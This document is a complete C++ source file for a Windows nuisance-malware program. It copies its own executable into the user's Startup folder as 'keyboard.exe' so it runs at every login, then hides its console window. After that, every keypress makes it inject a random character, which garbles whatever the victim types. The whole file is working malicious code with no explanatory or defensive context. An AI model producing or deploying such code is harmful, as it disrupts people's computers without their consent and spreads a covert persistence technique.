#include <iostream>
#include <Windows.h>
#include <cstdlib>
#include <ctime>
#include <fstream>
#pragma comment(lib, "User32.lib")
using namespace std;

const std::string ch = "qwertyuioplkjhgfdsamnb$%^*@#()_-_--||\\/[]{}vcxz QWERTYUIOPLKJHGFDSAZXCVBNM0123456789;'\"-+*/?`~";

string username = getenv("username");
string startup = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

void press(int key)
{
    INPUT input;
    input.type = INPUT_KEYBOARD;
    input.ki.wScan = 0;
    input.ki.time = 0;
    input.ki.dwExtraInfo = 0;
    input.ki.wVk = key;
    input.ki.dwFlags = 0;
    SendInput(1, &input, sizeof(INPUT));
    input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &input, sizeof(INPUT));
}

int main(int argc, char **argv)
{
    string cpfile = startup + "\\" + "keyboard.exe";
    ifstream tf(argv[0], ios::binary);
    ofstream sf(cpfile, ios::binary);
    sf << tf.rdbuf();
    tf.close();
    sf.close();
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);
    while (true)
    {
        srand(time(0));
        for (int key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                press(ch[rand()%ch.length()]);
            }
        }
        Sleep(3);
    }
    return 0;
}
